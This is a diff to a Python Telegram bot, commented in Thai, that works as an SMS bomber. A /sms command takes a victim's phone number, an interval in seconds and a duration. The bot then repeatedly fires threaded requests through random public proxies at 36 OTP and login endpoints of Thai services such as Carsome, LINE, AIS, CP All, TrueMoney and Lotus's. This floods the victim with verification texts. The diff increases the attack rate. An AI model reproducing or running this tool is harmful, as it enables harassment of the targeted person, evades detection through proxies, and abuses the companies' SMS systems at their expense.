@@ -4,19 +4,20 @@ from telegram.ext import Updater, CommandHandler, CallbackContext
 import requests
 import random
 import threading
+import time
+
+# ตั้งค่าการล็อก
+logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
 
 # Proxy List
 proxy_list = requests.get("https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt").text.splitlines()
 
-# API ทั้ง 36 ฟังก์ชัน
-
+# API ฟังก์ชัน
 def api1(phone):
     requests.post("https://www.carsome.co.th/website/login/sendSMS",
                   headers={"user-agent": "Mozilla/5.0"},
                   json={"username": phone, "optType": 0},
                   proxies={'http': 'http://' + random.choice(proxy_list)})
-
-# ... (เพิ่มฟังก์ชัน api2 ถึง api36 ที่นี่ตามเดิม)
 
 def api2(phone):
     requests.Session().post("https://api.jobbkk.com/v1/easy/otp_code",
@@ -172,7 +173,7 @@ def api30(phone):
                   proxies={'http': 'http://' + random.choice(proxy_list)})
 
 def api31(phone):
-    requests.post("https://shop.line.me/otp",
+    requests.post("https://line.me/otp/send",
                   json={"phone": phone},
                   proxies={'http': 'http://' + random.choice(proxy_list)})
 
@@ -182,85 +183,86 @@ def api32(phone):
                   proxies={'http': 'http://' + random.choice(proxy_list)})
 
 def api33(phone):
-    requests.post("https://www.cpall.co.th/auth/send-otp",
-                  json={"phone": phone},
-                  proxies={'http': 'http://' + random.choice(proxy_list)})
-
-def api34(phone):
     requests.post("https://www.ais.co.th/api/otp/send",
                   json={"phone": phone},
                   proxies={'http': 'http://' + random.choice(proxy_list)})
 
-def api35(phone):
-    requests.post("https://line.me/otp/send",
+def api34(phone):
+    requests.post("https://www.cpall.co.th/auth/send-otp",
                   json={"phone": phone},
                   proxies={'http': 'http://' + random.choice(proxy_list)})
-def api36(phone):
+
+def api35(phone):
     requests.post("https://truemoney.co.th/api/otp/send",
                   json={"phone": phone},
                   proxies={'http': 'http://' + random.choice(proxy_list)})
 
-# ฟังก์ชันที่ยิง SMS ทั้งหมด
-def send_all_apis(phone):
-    threading.Thread(target=api1, args=(phone,)).start()
-    threading.Thread(target=api2, args=(phone,)).start()
-    threading.Thread(target=api3, args=(phone,)).start()
-    threading.Thread(target=api4, args=(phone,)).start()
-    threading.Thread(target=api5, args=(phone,)).start()
-    threading.Thread(target=api6, args=(phone,)).start()
-    threading.Thread(target=api7, args=(phone,)).start()
-    threading.Thread(target=api8, args=(phone,)).start()
-    threading.Thread(target=api9, args=(phone,)).start()
-    threading.Thread(target=api10, args=(phone,)).start()
-    threading.Thread(target=api11, args=(phone,)).start()
-    threading.Thread(target=api12, args=(phone,)).start()
-    threading.Thread(target=api13, args=(phone,)).start()
-    threading.Thread(target=api14, args=(phone,)).start()
-    threading.Thread(target=api15, args=(phone,)).start()
-    threading.Thread(target=api16, args=(phone,)).start()
-    threading.Thread(target=api17, args=(phone,)).start()
-    threading.Thread(target=api18, args=(phone,)).start()
-    threading.Thread(target=api19, args=(phone,)).start()
-    threading.Thread(target=api20, args=(phone,)).start()
-    threading.Thread(target=api21, args=(phone,)).start()
-    threading.Thread(target=api22, args=(phone,)).start()
-    threading.Thread(target=api23, args=(phone,)).start()
-    threading.Thread(target=api24, args=(phone,)).start()
-    threading.Thread(target=api25, args=(phone,)).start()
-    threading.Thread(target=api26, args=(phone,)).start()
-    threading.Thread(target=api27, args=(phone,)).start()
-    threading.Thread(target=api28, args=(phone,)).start()
-    threading.Thread(target=api29, args=(phone,)).start()
-    threading.Thread(target=api30, args=(phone,)).start()
-    threading.Thread(target=api31, args=(phone,)).start()
-    threading.Thread(target=api32, args=(phone,)).start()
-    threading.Thread(target=api33, args=(phone,)).start()
-    threading.Thread(target=api34, args=(phone,)).start()
-    threading.Thread(target=api35, args=(phone,)).start()
-    threading.Thread(target=api36, args=(phone,)).start()
+def api36(phone):
+    requests.post("https://api-customer.lotuss.com/clubcard-bff/v1/customers/otp",
+                  data={"mobile_phone_no": phone},
+                  proxies={'http': 'http://' + random.choice(proxy_list)})
 
-# ฟังก์ชันสำหรับยิงซ้ำทุก X นาที (ขึ้นอยู่กับผู้ใช้กำหนดเวลา)
-def repeat_sms(phone, interval):
-    send_all_apis(phone)
-    threading.Timer(interval * 60.0, repeat_sms, args=[phone, interval]).start()  # เรียกซ้ำตามเวลาที่กำหนด
+# ฟังก์ชันที่ยิง SMS ทุกๆ X วินาที
+def send_sms(phone, interval, duration):
+    start_time = time.time()
+    while time.time() - start_time < duration:
+        threading.Thread(target=api1, args=(phone,)).start()
+        threading.Thread(target=api2, args=(phone,)).start()
+        threading.Thread(target=api3, args=(phone,)).start()
+        threading.Thread(target=api4, args=(phone,)).start()
+        threading.Thread(target=api5, args=(phone,)).start()
+        threading.Thread(target=api6, args=(phone,)).start()
+        threading.Thread(target=api7, args=(phone,)).start()
+        threading.Thread(target=api8, args=(phone,)).start()
+        threading.Thread(target=api9, args=(phone,)).start()
+        threading.Thread(target=api10, args=(phone,)).start()
+        threading.Thread(target=api11, args=(phone,)).start()
+        threading.Thread(target=api12, args=(phone,)).start()
+        threading.Thread(target=api13, args=(phone,)).start()
+        threading.Thread(target=api14, args=(phone,)).start()
+        threading.Thread(target=api15, args=(phone,)).start()
+        threading.Thread(target=api16, args=(phone,)).start()
+        threading.Thread(target=api17, args=(phone,)).start()
+        threading.Thread(target=api18, args=(phone,)).start()
+        threading.Thread(target=api19, args=(phone,)).start()
+        threading.Thread(target=api20, args=(phone,)).start()
+        threading.Thread(target=api21, args=(phone,)).start()
+        threading.Thread(target=api22, args=(phone,)).start()
+        threading.Thread(target=api23, args=(phone,)).start()
+        threading.Thread(target=api24, args=(phone,)).start()
+        threading.Thread(target=api25, args=(phone,)).start()
+        threading.Thread(target=api26, args=(phone,)).start()
+        threading.Thread(target=api27, args=(phone,)).start()
+        threading.Thread(target=api28, args=(phone,)).start()
+        threading.Thread(target=api29, args=(phone,)).start()
+        threading.Thread(target=api30, args=(phone,)).start()
+        threading.Thread(target=api31, args=(phone,)).start()
+        threading.Thread(target=api32, args=(phone,)).start()
+        threading.Thread(target=api33, args=(phone,)).start()
+        threading.Thread(target=api34, args=(phone,)).start()
+        threading.Thread(target=api35, args=(phone,)).start()
+        threading.Thread(target=api36, args=(phone,)).start()
+
+        time.sleep(interval)  # รอเวลา interval ก่อนยิง SMS ครั้งถัดไป
 
 # ฟังก์ชันจัดการคำสั่ง /sms
 def sms_command(update: Update, context: CallbackContext):
-    if len(context.args) != 2:
-        update.message.reply_text('กรุณาระบุ เบอร์โทร และ เวลาในนาที เช่น /sms 0812345678 2')
+    if len(context.args) != 3:
+        update.message.reply_text('กรุณาระบุ เบอร์โทร เวลา(วินาที) และ ระยะเวลา(นาที) เช่น /sms 0812345678 2 5')
         return
 
     phone = context.args[0]
     try:
-        interval = int(context.args[1])
+        interval = int(context.args[1])  # เวลาในการยิงซ้ำ (วินาที)
+        duration = int(context.args[2]) * 60  # ระยะเวลาในการยิง (นาที)
     except ValueError:
-        update.message.reply_text('โปรดระบุเวลาที่ถูกต้องในหน่วยนาที เช่น 1, 2, 5 เป็นต้น')
+        update.message.reply_text('โปรดระบุเวลาที่ถูกต้อง เช่น 2 หรือ 5')
         return
 
-    update.message.reply_text(f'เริ่มยิง SMS ไปยัง {phone} ทุก {interval} นาที')
+    update.message.reply_text(f'เริ่มยิง SMS ไปยัง {phone} ทุก {interval} วินาที เป็นเวลา {context.args[2]} นาที')
 
-    # เริ่มยิงซ้ำตามเวลาที่กำหนด
-    repeat_sms(phone, interval)
+    # เริ่มยิง SMS ต่อเนื่อง
+    threading.Thread(target=send_sms, args=(phone, interval, duration)).start()
 
 # ฟังก์ชันหลักสำหรับบอท
 def main():
@@ -276,4 +278,4 @@ def main():
 
 if __name__ == '__main__':
     main()
-  
+
